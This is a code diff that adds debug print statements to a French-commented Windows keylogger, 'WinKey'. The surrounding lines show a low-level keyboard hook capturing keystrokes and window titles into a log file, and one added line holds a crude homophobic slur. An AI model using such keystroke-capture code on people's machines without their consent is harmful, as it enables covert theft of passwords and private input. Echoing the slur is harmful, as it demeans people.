@@ -167,6 +167,8 @@ void logAccumulatedKeys(void) {
 void logWindowChange(void) {
     // Écrire les touches accumulées pour la fenêtre précédente
     logAccumulatedKeys();
+    fprintf(stderr, "DEBUGUAGE logwindowChange\n");
+
     
     if (g_winkey.keylog) {
         SYSTEMTIME st;
@@ -184,6 +186,8 @@ void logWindowChange(void) {
 }
 
 void sendKeyToLogFile(int vkCode) {
+    fprintf(stderr, "DEBUGUAGE sendKeyToLogFile\n");
+
     if (g_winkey.keylog) {
         // Gérer le backspace spécialement
         if (vkCode == VK_BACK) {
@@ -268,6 +272,8 @@ int main(int argc, char **argv) {
     
     // Initialiser la structure
     memset(&g_winkey, 0, sizeof(t_winkey));
+
+    fprintf(stderr, "Coucoiu les pds");
     
     // Ouvrir le fichier de log
     g_winkey.keylog = fopen(KEYLOG_FILE, "a");
@@ -294,6 +300,7 @@ int main(int argc, char **argv) {
     fprintf(g_winkey.keylog, "\n=== WinKey Started at %s ===\n", timestamp);
     fprintf(g_winkey.keylog, "Initial Window: %s\n\n", g_winkey.window_title);
     flushLogFile();
+    fprintf(stderr, "DEBUGUAGE Before hooks\n");
     
     // Installer le hook pour le clavier
     g_winkey.keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyhook_proc, GetModuleHandle(NULL), 0);
@@ -312,6 +319,7 @@ int main(int argc, char **argv) {
         fclose(g_winkey.keylog);
         return 1;
     }
+    fprintf(stderr, "DEBUGUAGE Before loop\n");
 
     printf("WinKey démarré. Appuyez sur Ctrl+C pour arrêter.\n");
 
@@ -319,7 +327,10 @@ int main(int argc, char **argv) {
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
+        fprintf(stderr, "DEBUGUAGE while loop\n");
+ 
     }
+    fprintf(stderr, "DEBUGUAGE after loop\n");
     
     // Nettoyage
     if (g_winkey.keyboard_hook) {
